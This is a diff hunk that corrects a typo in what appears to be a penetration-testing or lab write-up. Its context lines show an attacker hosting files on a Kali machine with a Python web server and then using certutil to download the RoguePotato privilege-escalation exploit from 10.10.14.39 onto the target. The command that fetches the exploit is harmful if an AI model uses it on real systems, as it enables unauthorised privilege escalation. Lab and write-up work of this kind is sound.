@@ -184,7 +184,7 @@ Once we have Rogue-Potato on our Kali, we need to transfer it over to the target
 python3 -m http.server 80
 ```
 
-Now we can download Rogue-Potao to the target with:
+Now we can download Rogue-Potato to the target with:
 
 ```cmd
 certutil -urlcache -f http://10.10.14.39/RoguePotato.exe rp.exe
